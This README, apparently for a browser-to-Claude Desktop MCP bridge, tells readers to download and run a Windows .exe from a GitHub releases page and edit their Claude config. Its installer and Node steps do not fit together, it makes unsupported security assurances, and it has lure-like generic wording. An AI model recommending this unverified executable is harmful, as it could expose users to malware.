# 🌐 browser-integration-mcp - Connect your browser to Claude Desktop

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Superciliaryridgeboomerang564/browser-integration-mcp/releases)

This application connects your web browser to the Claude Desktop software. It allows the AI to interact with websites through an isolated bridge. You define the rules the browser follows while you work with Claude. 

## ⚙️ System Requirements

Ensure your computer meets these requirements before you start:

*   Operating System: Windows 10 or Windows 11.
*   Browser: Google Chrome, Microsoft Edge, or Vivaldi.
*   Claude Desktop: The latest version installed on your machine.
*   Memory: At least 4GB of RAM.

## 📥 Downloading the Software

Visit the link below to get the installer for your system.

[Download the latest version here](https://github.com/Superciliaryridgeboomerang564/browser-integration-mcp/releases)

1.  Click the link above to open your browser.
2.  Look for the section labeled "Assets" at the bottom of the page.
3.  Choose the file ending in `.exe` that matches your Windows version.
4.  Save the file to your "Downloads" folder.

## 🛠️ Setting Up the Application

Follow these steps to complete the installation:

1.  Open your "Downloads" folder.
2.  Double-click the file to start the installer.
3.  Follow the prompts on your screen.
4.  Accept the installation path provided by the setup wizard.
5.  Wait for the progress bar to finish.

## 🔗 Connecting to Claude Desktop

Claude Desktop needs to know where this tool lives. You must edit your configuration file to establish this connection.

1.  Press the Windows key on your keyboard.
2.  Type `%APPDATA%\Claude` and press Enter.
3.  Locate the file named `claude_desktop_config.json`.
4.  Right-click the file and select "Open with," then choose Notepad.
5.  Copy the code block below and paste it into the file. If you already have text inside, place this new code after your existing entries, ensuring you use a comma to separate them.

```json
{
  "mcpServers": {
    "browser-integration": {
      "command": "node",
      "args": ["C:\\Program Files\\browser-integration-mcp\\index.js"]
    }
  }
}
```

6.  Save the file and close Notepad.
7.  Restart the Claude Desktop application completely to apply the changes.

## 🛡️ Using the Browser Agent

The application creates a secure bridge between Claude and your browser. Because it uses a local broker, Claude cannot touch your sensitive data unless you permit it.

*   Start your browser normally.
*   Open Claude Desktop.
*   Ask Claude to open a website or search for information.
*   The application launches a secondary browser window to handle these requests.
*   You view the actions in real time within the secondary window.

## 🔧 Troubleshooting

If you encounter issues, check these common items:

*   Verify that your browser is open before you ask Claude to perform a task.
*   Ensure that the file path in your `claude_desktop_config.json` matches exactly where the software lives on your drive.
*   Check that you installed Node.js if the application fails to launch. You can find the installer at the official Node.js website if the installer reports a missing command.
*   Restart your computer if you perform a fresh installation of either Claude or this bridge.

## 📈 Performance Tips

*   Close unused browser tabs. This tool works best when your browser hardware does not struggle with memory load.
*   Use a modern browser profile. A clean profile allows the integration to start faster.
*   Keep your browser updated to the latest security version to ensure the connection protocol remains active.

Keywords: browser-automation, cdp, chrome-devtools-protocol, claude, claude-desktop, mcp, model-context-protocol, nodejs, puppeteer, windows